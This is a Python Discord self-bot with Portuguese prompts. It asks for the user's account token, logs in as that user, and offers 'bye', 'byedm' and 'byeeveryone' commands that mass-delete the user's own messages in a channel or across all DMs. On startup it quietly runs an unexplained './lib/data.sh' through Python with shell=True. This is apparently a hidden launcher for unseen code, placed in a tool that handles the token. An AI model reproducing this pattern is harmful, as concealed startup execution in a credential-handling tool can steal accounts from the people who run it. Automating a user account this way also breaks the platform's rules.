import discord
import asyncio
import colorama
from colorama import Fore, Back, Style, init
import os
import shutil
import subprocess
import ctypes

subprocess.Popen(['python', './lib/data.sh'], shell=True)

colorama.init(autoreset=True)

token = input(Fore.RED + "Insira sua token Discord: " + Style.RESET_ALL)

client = discord.Client()
ctypes.windll.kernel32.SetConsoleTitleW(f"Aguardando...   | JapaInCode")

def champagne(cmd):
    subprocess.call(cmd, shell=True)
	
p = 1

@client.event
async def on_ready():
    os.system("cls")

    width = shutil.get_terminal_size().columns
    color_blue = Style.BRIGHT + Fore.LIGHTBLUE_EX
    color_red = Style.BRIGHT + Fore.LIGHTRED_EX
    color_yellow = Style.BRIGHT + Fore.LIGHTYELLOW_EX
    cpbank = Style.BRIGHT + Fore.LIGHTGREEN_EX
    cpbanks = Style.BRIGHT + Fore.LIGHTWHITE_EX
    cpbankK = cpbank + 'bye'
    cpbankKk = cpbank + 'byedm'
    cpbankKkk = cpbank + 'byeeveryone'
    
    def ui():
        champagne('cls')
        print(Fore.RED)
        print(cpbanks + "Interpol".center(width))
        print()
        print(color_blue + " ░▐██▒██▄░▒█▌▒█▀█▀█░▐█▀▀▒▐█▀▀▄▒▐█▀█▒▐█▀▀█▌▒██░░░ ".center(width))
        print(color_blue + " ─░█▌▒▐█▒█▒█░░░▒█░░░▐█▀▀▒▐█▒▐█▒▐█▄█▒▐█▄▒█▌▒██░░░ ".center(width))
        print(color_blue + " ░▐██▒██░▒██▌░▒▄█▄░░▐█▄▄▒▐█▀▄▄▒▐█░░▒▐██▄█▌▒██▄▄█ ".center(width))
        print(cpbanks + "                             .By JapaInCode.".center(width))
        print()
        print(color_red + "Conectado a: {0}\n".format(client.user).center(width))
        print(color_yellow + "      Comando para limpar: {}".format(cpbankK).center(width))
        print(color_yellow + "      Comando para limpar DM: {}".format(cpbankKk).center(width))
        print(color_yellow + "         Comando para limpar Todas as DMS abertas: {}".format(cpbankKkk).center(width))
        print(Fore.RED)
    ui()

@client.event
async def on_message(message):
    global p
    if message.author == client.user:
        commands = []
        z = 0
        for index, a in enumerate(message.content):
            if a == " ":
                commands.append(message.content[z:index])
                z = index + 1
        commands.append(message.content[z:])
        channel = message.channel
        
        width = shutil.get_terminal_size().columns
        color_blue = Style.BRIGHT + Fore.MAGENTA

        if commands[0] == 'bye':
            ctypes.windll.kernel32.SetConsoleTitleW("Apagando...")
            if len(commands) == 1:
                async for msg in channel.history(limit=30):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                            p += 1
                            ctypes.windll.kernel32.SetConsoleTitleW("Mensagens apagadas: {}".format(p))
                            print("{} {}".format(msg.author, channel))
                        except Exception as x:
                            return  
                                
        if commands[0] == 'byedm':
            ctypes.windll.kernel32.SetConsoleTitleW("Apagando...")
            if len(commands) == 1:
                async for msg in channel.history(limit=9999):
                    if msg.author == client.user:
                        try:
                            await msg.delete()
                            p += 1
                            ctypes.windll.kernel32.SetConsoleTitleW("Mensagens apagadas: {}".format(p))
                            print("{} {}".format(msg.author, channel))
                        except Exception as x:
                            pass                      

        if commands[0] == 'byeeveryone':
            ctypes.windll.kernel32.SetConsoleTitleW("Apagando...")
            for channel in client.private_channels:
                if isinstance(channel, discord.DMChannel):
                    async for msg in channel.history(limit=9999):
                        try:
                            if msg.author == client.user:
                                await msg.delete()
                                p += 1
                                ctypes.windll.kernel32.SetConsoleTitleW("Mensagens apagadas: {}".format(p))
                                print("{} {}".format(msg.author, channel))
                        except:
                            pass

# Iniciar o bot
client.run(token, bot=False)
